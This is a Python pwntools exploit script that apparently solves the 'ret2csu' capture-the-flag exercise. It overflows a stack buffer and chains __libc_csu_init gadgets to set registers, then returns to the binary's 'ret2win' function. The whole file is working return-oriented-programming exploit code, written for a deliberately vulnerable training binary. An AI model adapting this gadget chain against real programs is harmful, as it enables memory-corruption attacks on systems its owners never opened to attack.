#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break a le fin de pwnme
gs='''
b *pwnme+150
b *ret2win
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('ret2csu')
context.binary=elf
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# Offset avant ecrasement de l'adresse de retour
offset=0x28

ret2win=elf.plt['ret2win']

dynamic_s = elf.get_section_by_name('.dynamic').header['sh_addr']

# Gadgets
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
call_gadget=0x00400680
# 
#0x000000000040069a : pop rbx; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pops_gadget=0x0040069a

g_poprdi=0x004006a3


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

log.info(f".fini entry : 0x{dynamic_s+0x48:x}")

PL =b"A"*offset
PL+=p64(pops_gadget)
PL+=p64(0)                   # rbx = 0
PL+=p64(1)                   # rbp == rbx + 1
PL+=p64(dynamic_s+0x48)           # r12 .dynamics+48
PL+=p64(0xdeadbeefdeadbeef)  # r13
PL+=p64(0xcafebabecafebabe)  # r14
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(call_gadget)
PL+=p64(0)
PL+=p64(1)
PL+=p64(2)
PL+=p64(3)
PL+=p64(4)
PL+=p64(5)
PL+=p64(6)
PL+=p64(g_poprdi)           # fix rdi
PL+=p64(0xdeadbeefdeadbeef)  
PL+=p64(ret2win)         

io.sendline(PL)
io.interactive()

